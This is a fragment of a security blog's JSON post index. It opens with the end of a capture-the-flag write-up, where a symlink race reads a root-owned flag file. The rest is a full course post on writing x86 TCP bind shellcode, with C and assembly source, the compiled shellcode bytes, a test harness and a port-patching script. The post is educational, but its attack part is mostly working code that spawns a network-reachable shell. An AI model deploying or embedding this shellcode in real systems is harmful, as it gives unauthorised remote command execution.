 Launch /usr/bin/checker against ‚Äòblah‚Äô, then sleep for 0.5 seconds  Delete ‚Äòblah‚Äô and replace it with a symlink to /root/root.txt  After the programs comes out of the sleep() function, it‚Äôll read root.txt because it‚Äôs running as rootsmasher@smasher:~$ rm blah;echo 123 &gt; blah;(/usr/bin/checker blah &amp;);sleep 0.5;rm blah;ln -s /root/root.txt blahrm: cannot remove 'blah': No such file or directory[+] Welcome to file UID checker 0.1 by dzonerzysmasher@smasher:~$ File UID: 1001Data:077af&lt;redacted&gt;Flag: 077af&lt;redacted&gt;"
  },
  
  {
    "title": "TCP bind shellcode",
    "url": "/posts/tcp-bind-shellcode/",
    "categories": "slae, infosec",
    "tags": "slae, assembly, tcp bind shellcode",
    "date": "2018-11-18 00:00:00 +0800",
    





    
    "snippet": "A bind shellcode listens on a socket, waiting for a connection to be made to the server then executes arbitrary code, typically spawning shell for the connecting user. This post demonstrates a simp...",
    "content": "A bind shellcode listens on a socket, waiting for a connection to be made to the server then executes arbitrary code, typically spawning shell for the connecting user. This post demonstrates a simple TCP bind shellcode that executes a shell.The shellcode does the following:  Creates a socket  Binds the socket to an IP address and port  Listens for incoming connections  Redirects STDIN, STDOUT and STDERR to the socket once a connection is made  Executes a shellC prototypeTo better understand the process of creating a bind shellcode, I created a prototype in C that uses the same functions that‚Äôll be used in the assembly version. The full code is shown here. We‚Äôll walk through each section of the code after.#include &lt;netinet/in.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/socket.h&gt;#include &lt;unistd.h&gt;int main(){    // Create addr struct    struct sockaddr_in addr;    addr.sin_family = AF_INET;    addr.sin_port = htons(4444); // Port    addr.sin_addr.s_addr = htonl(INADDR_ANY); // Listen on any interface    // Create socket    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);    if (sock == -1) {        perror(\"Socket creation failed.\\n\");        exit(EXIT_FAILURE);    }    // Bind socket    if (bind(sock, (struct sockaddr *) &amp;addr, sizeof(addr)) == -1) {        perror(\"Socket bind failed.\\n\");        close(sock);        exit(EXIT_FAILURE);    }    // Listen for connection    if (listen(sock, 0) == -1) {        perror(\"Listen failed.\\n\");        close(sock);        exit(EXIT_FAILURE);    }    // Accept connection    int fd = accept(sock, NULL, NULL);    if (fd == -1) {        perror(\"Socket accept failed.\\n\");        close(sock);        exit(EXIT_FAILURE);    }    // Duplicate stdin/stdout/stderr to socket    dup2(fd, 0); // stdin    dup2(fd, 1); // stdout    dup2(fd, 2); // stderr    // Execute shell    execve(\"/bin/sh\", NULL, NULL);}1. Socket creation// Create socketint sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);if (sock == -1) {    perror(\"Socket creation failed.\\n\");    exit(EXIT_FAILURE);}The socket function requires 3 arguments:  int domain: The domain is AF_INET here since we are going to use IPv4 instead of local sockets or IPv6.  int type: For TCP sockets we use SOCK_STREAM. If we wanted to use UDP we‚Äôd use SOCK_DGRAM instead.  int protocol: For SOCK_STREAM, there‚Äôs a single protocol implemented, we could use 0 also here.2. Binding the socket// Create addr struct    struct sockaddr_in addr;    addr.sin_family = AF_INET;    addr.sin_port = htons(4444); // Port    addr.sin_addr.s_addr = htonl(INADDR_ANY); // Listen on any interface[...]// Bind socketif (bind(sock, (struct sockaddr *) &amp;addr, sizeof(addr)) == -1) {    perror(\"Socket bind failed.\\n\");    close(sock);    exit(EXIT_FAILURE);}A socket by itself doesn‚Äôt do anything since we haven‚Äôt associated the socket with any port or IP address. The bind function assigns the IP and port to the socket previously created. The man pages for ip explain the different parameters:struct sockaddr_in {   sa_family_t    sin_family; /* address family: AF_INET */   in_port_t      sin_port;   /* port in network byte order */   struct in_addr sin_addr;   /* internet address */};/* Internet address. */struct in_addr {   uint32_t       s_addr;     /* address in network byte order */};In data networking, packets are transmitted in big-endian order (aka network byte order), so we use the htons and htonl function to convert the port and address to the right endianness. The INADDR_ANY is just a reference to NULL, so the program will bind to all interfaces on the machine. If we wanted to listen on a specific interface we would use the IP address of the interface here.3. Listen and Accept connections// Listen for connectionif (listen(sock, 0) == -1) {    perror(\"Listen failed.\\n\");    close(sock);    exit(EXIT_FAILURE);}// Accept connectionint fd = accept(sock, NULL, NULL);if (fd == -1) {    perror(\"Socket accept failed.\\n\");    close(sock);    exit(EXIT_FAILURE);}The listen function tells the socket to listen for new connections. We can set the backlog to 0 since we only need to process a single connection request.The accept function requires 3 arguments:  int sockfd:  This is the value of the socket descriptor we created earlier  struct sockaddr *addr: We can set this to NULL because we don‚Äôt need to store the IP address of the connection host  socklen_t *addrlen: Set to NULL because we‚Äôre not using addrThe program now waits for incoming connection as this point. As indicated in the man page:  If no pending connections are present on the queue, and the socket is not marked as nonblocking, accept() blocks the caller until a connection is present.When the connection is received, the accept function will return the descriptor of the connection which we‚Äôll use to redirected IO to.4. Duplicate file descriptors    // Duplicate stdin/stdout/stderr to socket    dup2(fd, 0); //stdin    dup2(fd, 1); //stdout    dup2(fd, 2); //stderrBefore the shell is executed, the file descriptors for stdin, stdout and stderr are duplicated to the descriptor of the TCP connection. This is necessary to redirect input and output from the executed process to the network socket.5. Execute shell// Execute shellexecve(\"/bin/sh\", NULL, NULL);execve  does not start a new process but instead replaces the current program with a new one. Here the /bin/sh shell binary is used without any arguments passed to it. If we wanted to use another binary with command line arguments or environment variables, we‚Äôd pass those using the 2nd and 3rd arguments.Testing the programThe code is compiled as follows:slemire@slae:~/slae32/assignment1$ gcc -o shell_bind_tcp_c shell_bind_tcp.cshell_bind_tcp.c: In function ‚Äòmain‚Äô:shell_bind_tcp.c:50:2: warning: null argument where non-null required (argument 2) [-Wnonnull]  execve(\"/bin/sh\", NULL, NULL);  ^The compiler gives a warning because we‚Äôre using a NULL value instead of pointing to an array of strings but the code still works.Now it‚Äôs time to test it, :[In the first terminal session]slemire@slae:~/slae32/assignment1$ ./shell_bind_tcp...[Using another terminal session]slemire@slae:~$ nc -nv 127.0.0.1 4444Connection to 127.0.0.1 4444 port [tcp/*] succeeded!iduid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)ltrace can be used to record dynamic library calls made during the execution of the program. We can see both file descriptors created: fd 4 is the one created when the connection is accepted, and is the one used to redirect the input &amp; output to.slemire@supersnake:~/slae32/assignment1$ ltrace ./shell_bind_tcp_c__libc_start_main(0x804864b, 1, 0xbffff6b4, 0x80487f0 &lt;unfinished ...&gt;htons(4444, 0xb7fcc000, 0xb7fca244, 0xb7e320ec)                                                                        = 0x5c11htonl(0, 0xb7fcc000, 0xb7fca244, 0xb7e320ec)                                                                           = 0socket(2, 1, 6)                                                                                                        = 3bind(3, 0xbffff5ec, 16, 0xb7e320ec)                                                                                    = 0listen(3, 0, 16, 0xb7e320ec)                                                                                           = 0accept(3, 0, 0, 0xb7e320ec)                                                                                            = 4dup2(4, 0)                                                                                                             = 0dup2(4, 1)                                                                                                             = 1dup2(4, 2)                                                                                                             = 2execve(0x80488c5, 0, 0, 0xb7e320ec &lt;no return ...&gt;--- Called exec() ---Assembly versionThe assembly version follows the same logic flow previously used in the C protoype. First, registers are cleared to make sure there are no unintended side effects when testing the shellcode within the shellcode.c skeleton program. Initially, when I tested the code and didn‚Äôt clear out all registers, the ELF binary created by NASM worked ok but the shellcode inside the skeleton program crashed because EAX already had a value in the upper half of the register.; Zero registersxor eax, eaxxor ebx, ebxxor ecx, ecxxor edx, edxFor this shellcode version, I used the initial syscall used in earlier Linux versions where a single syscall was used to control all socket functions on the kernel. Newer Linux versions implement separate syscalls as indicated in the socketcall man page:  On a some architectures‚Äîfor example, x86-64 and ARM‚Äîthere is nosocketcall() system call; instead socket(2), accept(2), bind(2), andso on really are implemented as separate system calls.  On x86-32, socketcall() was historically the only entry point for thesockets API.  However, starting in Linux 4.3, direct system calls areprovided on x86-32 for the sockets API.int socketcall(int call, unsigned long *args);sys_socketcall works a bit differently than other syscalls. The first argument (EBX register) contains the function name being called and the 2nd argument in ECX contains a pointer to a memory address containing the various arguments for the function./usr/include/linux/net.h contains the following list of function calls:#define SYS_SOCKET  1       /* sys_socket(2)        */#define SYS_BIND    2       /* sys_bind(2)          */#define SYS_CONNECT 3       /* sys_connect(2)       */#define SYS_LISTEN  4       /* sys_listen(2)        */#define SYS_ACCEPT  5       /* sys_accept(2)        */...Let‚Äôs take the socket creation as an example:; Create socketmov al, 0x66        ; sys_socketcallmov bl, 0x1         ;   SYS_SOCKETpush 0x6            ; int protocol -&gt; IPPROTO_TCPpush 0x1            ; int type -&gt; SOCK_STREAMpush 0x2            ; int domain -&gt; AF_INETmov ecx, espint 0x80            ; sys_socketcall (SYS_SOCKET)mov edi, eax        ; save socket fdEAX contains 0x66 which is sys_socketcall, then EBX is set to 0x1 (SYS_SOCKET). Next the arguments for socket() itself are pushed on the stack then the value of the stack frame pointer is moved into ECX. When the function call returns, the descriptor value is saved into EDI so it can be used later.The sockaddr_in struct is created as follows:; Create addr structpush edx            ; NULL paddingpush edx            ; NULL paddingpush edx            ; sin.addr (0.0.0.0)push word 0x5c11    ; Portpush word 0x2       ; AF_INETmov esi, espSince the addr struct needs to be 16 bytes, $edx is pushed twice to add 8 bytes of null padding. $edx is pushed a third time to define the listening address for the socket and finally the port number is pushed followed by the domain value for AF_INET.For bind, we push the size of the addr struct (16 bytes), then its address which we saved to the $esi register earlier and the socket description from $edi.; Bind socketmov al, 0x66        ; sys_socketcallmov bl, 0x2         ;   SYS_BINDpush 0x10           ; socklen_t addrlenpush esi            ; const struct sockaddr *addrpush edi            ; int sockfd -&gt; saved socket fdmov ecx, espint 0x80            ; sys_socketcall (SYS_BIND)The listen and accept functions work the same way with the arguments being pushed on the stack and using sys_socketcall.; Listen for connectionmov al, 0x66        ; sys_socketcallmov bl, 0x4         ;   SYS_LISTENpush edx            ; int backlog -&gt; NULLpush edi            ; int sockfd -&gt; saved socket fdmov ecx, espint 0x80            ; sys_socketcall (SYS_LISTEN); Accept connectionmov al, 0x66        ; sys_socketcallmov bl, 0x5         ;   SYS_ACCEPTpush edx            ; socklen_t *addrlen -&gt; NULLpush edx            ; struct sockaddr *addr -&gt; NULLpush edi            ; int sockfd -&gt; saved sock fd valuemov ecx, espint 0x80            ; sys_socketcall (SYS_ACCEPT)To redirect IO to the descriptor, a loop with the $ecx register is used. Because of the way the loop instruction works (it exits when $ecx is 0), the dec and inc instruction are used here so we can still use the $ecx value to call dup2.; Redirect STDIN, STDOUT, STDERR to socketxor ecx, ecxmov cl, 0x3         ; counter for loop (stdin to stderr)mov ebx, edi        ; socket fddup2:mov al, 0x3f        ; sys_dup2dec ecxint 0x80            ; sys_dup2inc ecxloop dup2The /bin/bash program is used to spawn a shell, padding it with forward slashes so it is 4 bytes aligned. Because the string needs to be null-terminated, an garbage character (A) is added to string and is changed to a NULL with the subsequent mov byte [esp + 11], al instruction.; execve()xor eax, eaxpush 0x41687361     ; ///bin/bashApush 0x622f6e69push 0x622f2f2fmov byte [esp + 11], al ; NULL terminate stringmov al, 0xb         ; sys_execvemov ebx, esp        ; const char *filenamexor ecx, ecx        ; char *const argv[]xor edx, edx        ; char *const envp[]int 0x80            ; sys_execveThe final assembly code looks like this:global _startsection .text_start:    ; Zero registers    xor eax, eax    xor ebx, ebx    xor ecx, ecx    xor edx, edx    ; Create socket    mov al, 0x66        ; sys_socketcall    mov bl, 0x1         ;   SYS_SOCKET    push 0x6            ; int protocol -&gt; IPPROTO_TCP    push 0x1            ; int type -&gt; SOCK_STREAM    push 0x2            ; int domain -&gt; AF_INET    mov ecx, esp    int 0x80            ; sys_socketcall (SYS_SOCKET)    mov edi, eax        ; save socket fd    ; Create addr struct    push edx            ; NULL padding    push edx            ; NULL padding    push edx            ; sin.addr (0.0.0.0)    push word 0x5c11    ; Port    push word 0x2       ; AF_INET    mov esi, esp    ; Bind socket    mov al, 0x66        ; sys_socketcall    mov bl, 0x2         ;   SYS_BIND    push 0x10           ; socklen_t addrlen    push esi            ; const struct sockaddr *addr    push edi            ; int sockfd -&gt; saved socket fd    mov ecx, esp    int 0x80            ; sys_socketcall (SYS_BIND)    ; Listen for connection    mov al, 0x66        ; sys_socketcall    mov bl, 0x4         ;   SYS_LISTEN    push edx            ; int backlog -&gt; NULL    push edi            ; int sockfd -&gt; saved socket fd    mov ecx, esp    int 0x80            ; sys_socketcall (SYS_LISTEN)    ; Accept connection    mov al, 0x66        ; sys_socketcall    mov bl, 0x5         ;   SYS_ACCEPT    push edx            ; socklen_t *addrlen -&gt; NULL    push edx            ; struct sockaddr *addr -&gt; NULL    push edi            ; int sockfd -&gt; saved sock fd value    mov ecx, esp    int 0x80            ; sys_socketcall (SYS_ACCEPT)    mov edi, eax    ; Redirect STDIN, STDOUT, STDERR to socket    xor ecx, ecx    mov cl, 0x3         ; counter for loop (stdin to stderr)    mov ebx, edi        ; socket fd    dup2:    mov al, 0x3f        ; sys_dup2    dec ecx    int 0x80            ; sys_dup2    inc ecx    loop dup2    ; execve()    xor eax, eax    push 0x41687361     ; ///bin/bashA    push 0x622f6e69    push 0x622f2f2f    mov byte [esp + 11], al ; NULL terminate string    mov al, 0xb         ; sys_execve    mov ebx, esp        ; const char *filename    xor ecx, ecx        ; char *const argv[]    xor edx, edx        ; char *const envp[]    int 0x80            ; sys_execveCompiling and linking the code‚Ä¶slemire@slae:~/slae32/assignment1$ ../compile.sh shell_bind_tcp[+] Assembling with Nasm ... [+] Linking ...[+] Shellcode: \\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x52\\x52\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe6\\xb0\\x66\\xb3\\x02\\x6a\\x10\\x56\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x52\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52\\x57\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x89\\xfb\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf8\\x31\\xc0\\x68\\x61\\x73\\x68\\x41\\x68\\x69\\x6e\\x2f\\x62\\x68\\x2f\\x2f\\x2f\\x62\\x88\\x44\\x24\\x0b\\xb0\\x0b\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80[+] Length: 116[+] Done!Testing the ELF binary generated by NASM:slemire@slae:~/slae32/assignment1$ file shell_bind_tcpshell_bind_tcp: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped[...]slemire@slae:~/slae32/assignment1$ ./shell_bind_tcp[...]slemire@slae:~$ nc -nv 127.0.0.1 4444Connection to 127.0.0.1 4444 port [tcp/*] succeeded!iduid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)The shellcode.c program is then used to test the shellcode as it would used in an actual exploit:#include &lt;stdio.h&gt;char shellcode[]=\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x52\\x52\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe6\\xb0\\x66\\xb3\\x02\\x6a\\x10\\x56\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x52\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52\\x57\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x89\\xfb\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf8\\x31\\xc0\\x68\\x61\\x73\\x68\\x41\\x68\\x69\\x6e\\x2f\\x62\\x68\\x2f\\x2f\\x2f\\x62\\x88\\x44\\x24\\x0b\\xb0\\x0b\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80\";int main(){    int (*ret)() = (int(*)())shellcode;    printf(\"Size: %d bytes.\\n\", sizeof(shellcode));    ret();}The test program is compiled and tested:slemire@slae:~/slae32/assignment1$ gcc -o shellcode -fno-stack-protector -z execstack shellcode.c    slemire@slae:~/slae32/assignment1$ ./shellcode[...]slemire@slae:~$ nc -nv 127.0.0.1 4444Connection to 127.0.0.1 4444 port [tcp/*] succeeded!whoamislemire2nd version using syscallsThe 2nd version of this bind shellcode uses the new syscalls. According to the following kernel patch, sometimes in 2010 they added new syscall entries for non-multiplexed socket calls.The ones that interest us are:#define __NR_socket 359#define __NR_bind 361#define __NR_connect 362#define __NR_listen 363#define __NR_accept4 364Instead of using sys_socketcall, we can use those syscalls directly and put the arguments in the registers. The same code flow is used but the arguments are passed differently.The second version of the shellcode looks like this:global _startsection .text_start:    ; Zero registers    xor eax, eax    xor ebx, ebx    xor ecx, ecx    xor edx, edx    ; Create socket    mov ax, 0x167       ; sys_socket    mov bl, 0x2         ; int domain -&gt; AF_INET    inc ecx             ; int type -&gt; SOCK_STREAM    mov dl, 0x6         ; int protocol -&gt; IPPROTO_TCP    int 0x80            ; sys_socket    mov edi, eax        ; save socket fd    ; Create addr struct    xor edx, edx    push edx            ; NULL padding    push edx            ; NULL padding    push edx            ; sin.addr (0.0.0.0)    push word 0x5c11    ; Port    push word 0x2       ; AF_INET    mov esi, esp    ; Bind socket    mov ax, 0x169       ; sys_bind    mov ebx, edi        ; int sockfd -&gt; saved socket fd    mov ecx, esi        ; const struct sockaddr *addr    mov dl, 0x10        ; socklen_t addrlen    int 0x80            ; sys_bind    ; Listen for connection    mov ax, 0x16b       ; sys_listen    mov ebx, edi        ; int sockfd -&gt; saved socket fd    xor ecx, ecx        ; int backlog -&gt; NULL    int 0x80            ; sys_socketcall (SYS_LISTEN)    ; Accept connection    mov ax, 0x16c       ; sys_accept4    mov ebx, edi        ; int sockfd -&gt; saved sock fd value    xor ecx, ecx        ; struct sockaddr *addr -&gt; NULL    xor edx, edx        ; socklen_t *addrlen -&gt; NULL    xor esi, esi    int 0x80            ; sys_socketcall (SYS_ACCEPT)    mov edi, eax        ; save the new fd    ; Redirect STDIN, STDOUT, STDERR to socket    xor ecx, ecx    mov cl, 0x3         ; counter for loop (stdin to stderr)    mov ebx, edi        ; socket fd    dup2:    mov al, 0x3f        ; sys_dup2    dec ecx    int 0x80            ; sys_dup2    inc ecx    loop dup2    ; execve()    xor eax, eax    push 0x41687361     ; ///bin/bashA    push 0x622f6e69    push 0x622f2f2f    mov byte [esp + 11], al ; NULL terminate string    mov al, 0xb         ; sys_execve    mov ebx, esp        ; const char *filename    xor ecx, ecx        ; char *const argv[]    xor edx, edx        ; char *const envp[]    int 0x80            ; sys_execveIf we want to change the listening port, we can modify the assembly code and re-compile it but instead it would be more convenient to use a small python script that will automatically replace the port in the shellcode.The following script replaces the hardcoded port 4444 from the shellcode with the port supplied at the command line. The script also gives a warning if any null bytes are contained in the modified shellcode. Depending on which port is being used, it‚Äôs possible some values may generate null bytes.#!/usr/bin/pythonimport socketimport sysshellcode =  '\\\\x31\\\\xc0\\\\x31\\\\xdb\\\\x31\\\\xc9\\\\x31\\\\xd2\\\\xb0\\\\x66\\\\xb3\\\\x01\\\\x6a\\\\x06\\\\x6a\\\\x01'shellcode += '\\\\x6a\\\\x02\\\\x89\\\\xe1\\\\xcd\\\\x80\\\\x89\\\\xc7\\\\x52\\\\x52\\\\x52\\\\x66\\\\x68\\\\x11\\\\x5c\\\\x66'shellcode += '\\\\x6a\\\\x02\\\\x89\\\\xe6\\\\xb0\\\\x66\\\\xb3\\\\x02\\\\x6a\\\\x10\\\\x56\\\\x57\\\\x89\\\\xe1\\\\xcd\\\\x80'shellcode += '\\\\xb0\\\\x66\\\\xb3\\\\x04\\\\x52\\\\x57\\\\x89\\\\xe1\\\\xcd\\\\x80\\\\xb0\\\\x66\\\\xb3\\\\x05\\\\x52\\\\x52'shellcode += '\\\\x57\\\\x89\\\\xe1\\\\xcd\\\\x80\\\\x89\\\\xc7\\\\x31\\\\xc9\\\\xb1\\\\x03\\\\x89\\\\xfb\\\\xb0\\\\x3f\\\\x49'shellcode += '\\\\xcd\\\\x80\\\\x41\\\\xe2\\\\xf8\\\\x31\\\\xc0\\\\x68\\\\x61\\\\x73\\\\x68\\\\x41\\\\x68\\\\x69\\\\x6e\\\\x2f'shellcode += '\\\\x62\\\\x68\\\\x2f\\\\x2f\\\\x2f\\\\x62\\\\x88\\\\x44\\\\x24\\\\x0b\\\\xb0\\\\x0b\\\\x89\\\\xe3\\\\x31\\\\xc9'shellcode += '\\\\x31\\\\xd2\\\\xcd\\\\x80'if len(sys.argv) &lt; 2:    print('Usage: {name} [port]'.format(name = sys.argv[0]))    exit(1)port = sys.argv[1]port_htons = hex(socket.htons(int(port)))byte1 = port_htons[4:]if byte1 == '':    byte1 = '0'byte2 = port_htons[2:4]shellcode = shellcode.replace('\\\\x11\\\\x5c', '\\\\x{}\\\\x{}'.format(byte1, byte2))print('Here\\'s the shellcode using port {port}:'.format(port = port))print(shellcode)if '\\\\x0\\\\' in shellcode or '\\\\x00\\\\' in shellcode:    print('##################################')    print('Warning: Null byte in shellcode!')    print('##################################')Here‚Äôs the script in action:slemire@slae:~/slae32/assignment1$ ./prepare.py 5555Here's the shellcode using port 5555:\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x52\\x52\\x66\\x68\\x15\\xb3\\x66\\x6a\\x02\\x89\\xe6\\xb0\\x66\\xb3\\x02\\x6a\\x10\\x56\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x52\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52\\x57\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x89\\xfb\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf8\\x31\\xc0\\x68\\x61\\x73\\x68\\x41\\x68\\x69\\x6e\\x2f\\x62\\x68\\x2f\\x2f\\x2f\\x62\\x88\\x44\\x24\\x0b\\xb0\\x0b\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80The shellcode is then added to the test program.#include &lt;stdio.h&gt;char shellcode[]=\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x52\\x52\\x66\\x68\\x15\\xb3\\x66\\x6a\\x02\\x89\\xe6\\xb0\\x66\\xb3\\x02\\x6a\\x10\\x56\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x52\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52\\x57\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x89\\xfb\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf8\\x31\\xc0\\x68\\x61\\x73\\x68\\x41\\x68\\x69\\x6e\\x2f\\x62\\x68\\x2f\\x2f\\x2f\\x62\\x88\\x44\\x24\\x0b\\xb0\\x0b\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80\";int main(){        int (*ret)() = (int(*)())shellcode;        printf(\"Size: %d bytes.\\n\", sizeof(shellcode));         ret();}"
  }
  
]

